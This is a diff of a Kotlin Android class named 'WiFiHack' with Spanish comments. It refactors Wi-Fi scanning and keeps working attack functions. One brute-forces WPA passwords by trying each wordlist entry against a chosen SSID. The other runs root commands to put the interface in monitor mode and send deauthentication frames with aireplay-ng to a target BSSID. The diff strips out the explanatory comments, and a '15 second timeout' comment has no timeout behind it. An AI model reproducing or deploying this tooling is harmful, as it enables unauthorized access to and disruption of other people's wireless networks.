@@ -1,11 +1,16 @@
 package com.industrialble.network
 
+import android.content.BroadcastReceiver
 import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
 import android.net.wifi.ScanResult
 import android.net.wifi.WifiConfiguration
 import android.net.wifi.WifiManager
-import android.os.Build
 import com.industrialble.tools.RootChecker
+import kotlinx.coroutines.channels.awaitClose
+import kotlinx.coroutines.flow.Flow
+import kotlinx.coroutines.flow.callbackFlow
 
 /**
  * Módulo WiFi: escaneo, deauth (root) y fuerza bruta.
@@ -24,13 +29,14 @@ class WiFiHack(private val context: Context) {
         val channel: Int = 0
     )
 
-    /** Escanea redes WiFi disponibles */
-    fun scanNetworks(): List<WiFiNetwork> {
-        if (!wifiManager.isWifiEnabled) return emptyList()
+    /** Devuelve el estado del WiFi */
+    fun isWifiEnabled(): Boolean = wifiManager.isWifiEnabled
 
+    /** Escanea redes WiFi disponibles (resultados del último scan) */
+    fun getScanResults(): List<WiFiNetwork> {
+        if (!wifiManager.isWifiEnabled) return emptyList()
         return try {
-            val results = wifiManager.scanResults
-            results
+            wifiManager.scanResults
                 .distinctBy { it.BSSID }
                 .map { result ->
                     WiFiNetwork(
@@ -47,11 +53,41 @@ class WiFiHack(private val context: Context) {
         } catch (_: Exception) { emptyList() }
     }
 
-    /** Inicia un escaneo y devuelve los resultados */
-    fun startScan(): Boolean {
-        return try {
-            wifiManager.startScan()
-        } catch (_: Exception) { false }
+    /** Inicia un escaneo WiFi y devuelve un Flow que emite cuando hay resultados */
+    fun startScanWithFlow(): Flow<List<WiFiNetwork>> = callbackFlow {
+        if (!wifiManager.isWifiEnabled) {
+            trySend(emptyList())
+            close()
+            return@callbackFlow
+        }
+
+        val receiver = object : BroadcastReceiver() {
+            override fun onReceive(ctx: Context, intent: Intent) {
+                if (intent.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
+                    ctx.unregisterReceiver(this)
+                    val networks = getScanResults()
+                    trySend(networks)
+                    close()
+                }
+            }
+        }
+
+        context.registerReceiver(
+            receiver,
+            IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
+        )
+
+        // Timeout de 15 segundos
+        val success = wifiManager.startScan()
+        if (!success) {
+            context.unregisterReceiver(receiver)
+            trySend(emptyList())
+            close()
+        }
+
+        awaitClose {
+            try { context.unregisterReceiver(receiver) } catch (_: Exception) {}
+        }
     }
 
     /** Devuelve las redes guardadas en el dispositivo */
@@ -61,10 +97,6 @@ class WiFiHack(private val context: Context) {
         } catch (_: Exception) { emptyList() }
     }
 
-    /**
-     * Fuerza bruta WiFi: intenta conectarse con cada contraseña de la wordlist.
-     * Funciona sin root (usa WifiManager API).
-     */
     @Suppress("DEPRECATION")
     fun bruteForce(
         ssid: String,
@@ -75,37 +107,28 @@ class WiFiHack(private val context: Context) {
     ) {
         Thread {
             val cleanSsid = "\"${ssid.removeSurrounding("\"")}\""
-
             for ((index, password) in passwords.withIndex()) {
                 onProgress(index + 1, passwords.size, password)
-
                 try {
                     val config = WifiConfiguration().apply {
                         SSID = cleanSsid
                         allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
-
-                        // WPA/WPA2
                         if (password.isNotEmpty()) {
                             preSharedKey = "\"$password\""
                             allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                         }
                     }
-
                     val netId = wifiManager.addNetwork(config)
                     if (netId != -1) {
                         wifiManager.disconnect()
                         val enabled = wifiManager.enableNetwork(netId, true)
                         if (enabled) {
-                            // Esperar a que conecte
                             Thread.sleep(2000)
                             val info = wifiManager.connectionInfo
                             if (info != null && info.ssid == cleanSsid && info.networkId == netId) {
-                                onFound(password)
-                                onFinish(true)
-                                return@Thread
+                                onFound(password); onFinish(true); return@Thread
                             }
                         }
-                        // Eliminar la red después del intento
                         wifiManager.removeNetwork(netId)
                         wifiManager.saveConfiguration()
                         wifiManager.reconnect()
@@ -116,33 +139,21 @@ class WiFiHack(private val context: Context) {
         }.start()
     }
 
-    /**
-     * Ataque deauth via root (requiere monitor mode + airoping-ng).
-     * En la mayoría de smartphones NO funcionará sin kernel custom.
-     */
     fun deauthAttack(bssid: String, interfaceName: String = "wlan0", onLog: (String) -> Unit) {
         Thread {
             onLog("🔴 Verificando root...")
             val root = RootChecker.check(context)
-            if (!root.isRooted) {
-                onLog("❌ Se requiere root para deauth attack")
-                return@Thread
-            }
-
+            if (!root.isRooted) { onLog("❌ Se requiere root"); return@Thread }
             onLog("📡 Preparando interfaz $interfaceName...")
-            // Intentar poner la interfaz en modo monitor (generalmente falla en smartphones)
             RootChecker.execRootCommand("ip link set $interfaceName down")
             RootChecker.execRootCommand("iw dev $interfaceName set type monitor")
             RootChecker.execRootCommand("ip link set $interfaceName up")
-
             onLog("⚠️ Enviando deauth a $bssid...")
             RootChecker.execRootCommand("aireplay-ng -0 5 -a $bssid $interfaceName")
-
-            onLog("🔧 Restaurando interfaz...")
+            onLog("🔧 Restaurando...")
             RootChecker.execRootCommand("ip link set $interfaceName down")
             RootChecker.execRootCommand("iw dev $interfaceName set type managed")
             RootChecker.execRootCommand("ip link set $interfaceName up")
-
             onLog("✅ Deauth completado")
         }.start()
     }
@@ -158,11 +169,9 @@ class WiFiHack(private val context: Context) {
         }
     }
 
-    private fun freqToChannel(freq: Int): Int {
-        return when {
-            freq in 2412..2484 -> (freq - 2412) / 5 + 1
-            freq in 5170..5825 -> (freq - 5170) / 5 + 34
-            else -> 0
-        }
+    private fun freqToChannel(freq: Int): Int = when {
+        freq in 2412..2484 -> (freq - 2412) / 5 + 1
+        freq in 5170..5825 -> (freq - 5170) / 5 + 34
+        else -> 0
     }
 }
